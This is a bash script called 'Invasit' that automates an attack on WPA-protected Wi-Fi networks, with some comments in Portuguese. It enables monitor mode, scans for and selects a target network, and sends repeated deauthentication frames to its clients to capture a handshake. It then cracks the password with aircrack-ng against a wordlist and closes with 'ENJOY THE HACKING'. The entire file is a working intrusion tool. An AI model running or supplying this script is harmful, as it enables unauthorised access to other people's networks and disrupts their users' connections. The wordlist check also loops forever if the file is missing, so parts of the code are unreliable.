#!/bin/bash

# Invasit version 1 || by: valvesss

# Main
MAIN(){
	MONMODE
}

# 1) Create NIC mon0
MONMODE(){
nic=mon0
iwconfig > nic.txt
nicreal=$(cat nic.txt | awk 'NR==1{print $1}')
rm -rf nic.txt
if iwconfig | grep -q $nic ; then
	clear
	echo''
	SOLARQ
else
	clear
	iw dev $nicreal interface add $nic type monitor &> /dev/null
	SOLARQ 
fi
}

# 2) Ask for the name of all files the will be generated
SOLARQ(){
clear
echo '1) Set the name of the files:'
read name
GERTAB
}

# 3) Generate table with all WPA networks found
GERTAB(){
echo "2) When you find the target network, press CTRL+C."
xterm -title $name -e airodump-ng --encrypt WPA $nic -w $name -o csv
clear
COMDAD
}

# 4) Edit airodump output in a human readable way
COMDAD(){
cat $name-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $name.txt
rm -rf $name-01.csv
cat $name.txt
echo ''
echo '3) Select the network you want to attack:'
read num
bssidtarget=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $3}')
channel=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $4}')
networkname=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $2}')
rm -rf $name.txt
GERDAD
}

# 5) Gera dados para capturar o BSSID dos clientes
GERDAD(){
clear
echo '4) Wait to list 2 or more client above STATION column and press CTRL+C.'
aux=1
	while [ $aux = 1 ]; do
		xterm -title $name -e airodump-ng --bssid $bssidtarget -w $name -o csv $nic
		echo "Try again? [0/1]"
		read aux
	done
mac=$name.lst
ls
cat $name-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
rm -rf $name-01.csv
HANDSHAKE
}

# 7) Start the handshake capture
HANDSHAKE(){
echo "5) Wait until to show: WPA Handshake XX:XX:XX:XX:XX:XX"
xterm -title $name -e airodump-ng -d $bssidtarget -c $channel -w $name -o cap $nic &
clear
nr=$(cat $mac | wc -l)
i=1
	while [ $i -le $nr ]; do
		bssidclient=$(awk -v var=$i 'NR==var' $mac)
		xterm -title $name -e aireplay-ng -0 15 -a $bssidtarget -c $bssidclient $nic --ignore-negative-one
		let i=i+1
	done
rm -rf $name.lst
WORDLIST
}

# 8) Search wordlist and verify if don't exist
WORDLIST(){
echo 'Type the wordlist full path:'
read path
a=0
while [ $a -eq 0  ]
do
	if [ !  -f $path ]; then
		echo "File not found, try again."
	else
		a=1
	fi
done
AIRCRACK
}

# 9) Decryptograph the password
AIRCRACK(){
aircrack-ng $name-01.cap -w $path
FIM
}

# 10) Reinicialize network services and delete the nic created
FIM(){
iw dev $nic del
service NetworkManager restart
service networking restart
clear
}
MAIN
echo '####################################'
echo '##	ENJOY THE HACKING	##'
echo '####################################'
